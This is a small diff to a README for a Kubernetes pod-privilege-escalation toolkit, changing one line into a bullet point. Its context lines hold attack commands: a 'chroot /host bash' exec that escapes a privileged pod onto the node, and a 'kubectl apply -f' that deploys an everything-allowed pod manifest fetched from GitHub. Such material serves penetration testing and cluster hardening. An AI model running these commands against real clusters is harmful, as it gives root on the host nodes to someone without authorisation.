@@ -29,7 +29,7 @@ kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
 ```
 **Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
 
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-exec-[RESOURCE_TYPE].yaml 
